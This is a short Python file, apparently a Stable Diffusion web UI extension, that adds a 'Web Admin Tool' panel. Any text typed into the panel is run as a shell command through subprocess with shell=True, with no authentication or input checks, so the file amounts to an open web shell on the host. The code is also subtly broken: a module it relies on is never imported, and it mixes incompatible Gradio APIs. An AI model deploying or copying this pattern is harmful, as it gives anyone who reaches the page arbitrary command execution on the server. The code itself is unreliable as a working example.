import gradio as gr
import subprocess

# 定义网站管理工具类
class WebAdminTool:
    def __init__(self):
        self.command_output = ""

    # 返回工具名称
    def title(self):
        return "Web Admin Tool"

    # 总是显示菜单
    def show(self, is_img2img):
        return scripts.AlwaysVisible

    # 设置菜单界面
    def ui(self, is_img2img):
        with gr.Accordion('Web Admin Tool', open=False):
            with gr.Row():
                command_input = gr.Textbox(lines=1, label="Command")
                execute_button = gr.Button(label="Execute")
        return [command_input, execute_button]

    # 执行命令
    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            return output
        except subprocess.CalledProcessError as e:
            return str(e.output)

    # 处理用户输入和命令执行
    def run(self, command_input, execute_button):
        if execute_button:
            command = command_input.strip()
            self.command_output = self.execute_command(command)
        return self.command_output

# 创建Web管理工具对象
web_admin_tool = WebAdminTool()

# 创建Gradio界面
iface = gr.Interface(
    fn=web_admin_tool.run,
    inputs=web_admin_tool.ui,
    outputs=gr.Textbox(label="Command Output"),
    title=web_admin_tool.title()
)

# 启动Gradio界面
iface.launch()
